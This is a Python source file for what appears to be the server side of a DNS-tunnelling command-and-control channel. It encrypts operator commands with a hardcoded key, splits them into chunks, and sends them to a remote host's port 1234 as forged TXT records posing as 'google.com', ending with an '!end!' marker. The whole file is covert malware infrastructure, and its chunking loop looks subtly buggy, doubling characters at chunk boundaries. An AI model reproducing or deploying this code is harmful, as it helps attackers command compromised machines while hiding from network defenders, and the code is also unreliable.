from dnslib import DNSRecord, DNSHeader, RR

from dataEncryptor import dataEncryptor

class Payload:
    def __init__(self,addr):
        self.addr = addr

    def payload(self,sock,req,com):
        d = dataEncryptor()
        finalCommand = d.encrypting(com, "hellothisismebob")
        if len(finalCommand) >= 250:
            finalResultSeperated = list()
            eachList = ""
            for char in range(len(finalCommand)):
                if len(eachList) <= 249 and char != (len(finalCommand) - 1):
                    eachList += finalCommand[char]
                else:
                    if char == (len(finalCommand) - 1):
                        eachList += finalCommand[char]
                    eachList += finalCommand[char]
                    finalResultSeperated.append(eachList)
                    eachList = ""
            for i in range(len(finalResultSeperated)):
                request = DNSRecord.parse(req)
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalResultSeperated[i] + "!"))
                resp = reply.pack()
                sock.sendto(resp,(self.addr,1234))

            request = DNSRecord.parse(req)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
            resp = reply.pack()
            sock.sendto(resp,(self.addr,1234))

        else:
            request = DNSRecord.parse(req)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalCommand + "!"))
            resp = reply.pack()
            sock.sendto(resp,(self.addr,1234))
            request = DNSRecord.parse(req)
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
            resp = reply.pack()
            sock.sendto(resp,(self.addr,1234))